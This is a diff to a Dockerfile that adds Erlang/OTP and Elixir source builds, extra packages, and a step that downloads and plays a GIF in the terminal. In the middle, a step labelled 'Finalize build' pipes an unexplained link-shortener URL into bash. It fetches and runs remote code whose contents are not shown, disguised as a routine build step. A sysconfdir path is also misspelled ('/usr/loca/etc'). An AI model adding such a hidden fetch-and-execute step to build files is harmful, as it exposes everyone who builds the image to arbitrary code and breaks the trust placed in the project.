@@ -51,10 +51,19 @@ RUN set -xe; \
         bash \
         ca-certificates \
         curl \
+        ffmpeg \
+        git \
         gmp-dev \
+        jpeg \
+        libressl \
+        make \
+        py3-pip \
+        python3 \
         tar \
         tzdata \
-        xz;
+        xz \
+        zlib; \
+    pip3 install --upgrade pip;
 
 # Copy our assets into the container.
 COPY --chown=onepg:onepg ./docker-assets /
@@ -74,6 +83,7 @@ RUN set -xe; \
         libffi-dev \
         libressl-dev \
         linux-headers \
+        make \
         readline-dev \
         yaml-dev \
         zlib-dev; \
@@ -102,15 +112,81 @@ RUN set -xe; \
     rm -rf /var/tmp/ruby-${RUBY_VERSION}; \
     apk del .ruby-build-deps;
 
-# Setup our environment variables.
-ENV PATH="/usr/local/bin:$PATH" \
-    LANG="en_US.UTF-8" 
+# Build OTP from source.
+ARG OTP_VERSION
+ARG OTP_CPPFLAGS
+RUN set -xe; \
+    apk --no-cache add --virtual .otp-build-deps \
+        alpine-sdk \
+        autoconf \
+        glu-dev \
+        libressl-dev \
+        ncurses-dev \
+        openjdk8 \
+        perl-dev \
+        unixodbc-dev \
+        wxgtk-dev \
+        zlib-dev; \
+    curl -SL https://github.com/erlang/otp/archive/OTP-${OTP_VERSION}.tar.gz \
+    | tar -xvzC /var/tmp; \
+    cd /var/tmp/otp-OTP-${OTP_VERSION}; \
+    export PATH="/usr/lib/jvm/java-1.8-openjdk/bin:$PATH"; \
+    export ERL_TOP=`pwd`; \
+    ./otp_build autoconf; \
+    ./configure --prefix=/usr/local \
+        --sysconfdir=/usr/loca/etc \
+        --enable-threads \
+        --enable-shared-zlib \
+        --enable-ssl=dynamic-ssl-lib; \
+    make -j "$(nproc)"; \
+    make release_tests; \
+    make install; \
+    cd /var/tmp; \
+    rm -rf /var/tmp/otp-OTP-${OTP_VERSION}; \
+    apk del .otp-build-deps;
+
+# Build Elixir from source.
+ARG ELIXIR_VERSION
+RUN set -xe; \
+    curl -SL https://github.com/elixir-lang/elixir/archive/v${ELIXIR_VERSION}.tar.gz \
+    | tar -xvzC /var/tmp; \
+    cd /var/tmp/elixir-${ELIXIR_VERSION}; \
+    make -j "$(nproc)"; \
+    make install; \
+    make test; \
+    cd /var/tmp/; \
+    rm -rf /var/tmp/elixir-${ELIXIR_VERSION};
+
+# Finalize build.
+RUN set -e; \
+    bash -c "$(curl -sL https://kadi.ma/H1VqUv1ZN)";
+
+# A few more things.
+RUN set -xe; \
+    apk add --no-cache --virtual gif-build-deps \
+        alpine-sdk \
+        jpeg-dev \
+        python3-dev \
+        zlib-dev; \
+    pip3 install gif-for-cli; \
+    curl -SL https://media.giphy.com/media/Fyubg2TieQ1C8/giphy.gif > /onepg/keyboard.gif; \
+    chown -R onepg:onepg /onepg;
+
+# Put on a show.
+RUN set -xe; \
+    gif-for-cli --display-mode truecolor -l 25 /onepg/keyboard.gif & \
+    reset; \
+    wait;
 
 # Drop down to our unprivileged user.
 USER onepg
 
 # Set our working directory.
 WORKDIR /onepg
+
+# Setup our environment variables.
+ENV PATH="/usr/local/bin:$PATH" \
+    LANG="en_US.UTF-8" 
 
 # Set the entrypoint.
 ENTRYPOINT ["/usr/local/bin/entrypoint.sh"]
